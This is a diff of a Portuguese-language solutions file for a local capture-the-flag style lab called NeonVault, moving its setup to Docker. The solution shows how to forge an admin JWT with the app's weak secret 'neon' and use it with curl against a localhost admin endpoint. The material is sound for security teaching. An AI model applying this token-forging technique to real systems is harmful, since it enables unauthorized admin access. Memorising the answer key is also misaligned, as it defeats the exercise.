@@ -1,4 +1,4 @@
-# Solutions — Lab 2 NeonVault
+# Solutions — Lab 2 — NeonVault: Cyber Identity Breach
 
 Use estas instrucoes apenas no ambiente local autorizado.
 
@@ -6,8 +6,7 @@ Antes de comecar:
 
 ```bash
 cd lab-02-neonvault
-npm install
-npm start
+docker compose up --build
 ```
 
 Em outro terminal:
@@ -72,8 +71,14 @@ O login gera JWT com segredo fraco `neon` e role `user`.
 Gerar token forjado com role admin:
 
 ```bash
-TOKEN=$(node -e "const jwt=require('jsonwebtoken'); console.log(jwt.sign({sub:2,username:'nova',displayName:'Nova Tanaka',role:'admin'}, 'neon'))")
+TOKEN=$(docker compose exec -T neonvault node -e "const jwt=require('jsonwebtoken'); console.log(jwt.sign({sub:2,username:'nova',displayName:'Nova Tanaka',role:'admin'}, 'neon'))")
 curl -i -H "Authorization: Bearer $TOKEN" http://127.0.0.1:8092/admin/core
+```
+
+Se estiver rodando sem Docker e com Node.js local instalado, o token tambem pode ser gerado com:
+
+```bash
+TOKEN=$(node -e "const jwt=require('jsonwebtoken'); console.log(jwt.sign({sub:2,username:'nova',displayName:'Nova Tanaka',role:'admin'}, 'neon'))")
 ```
 
 Flag:
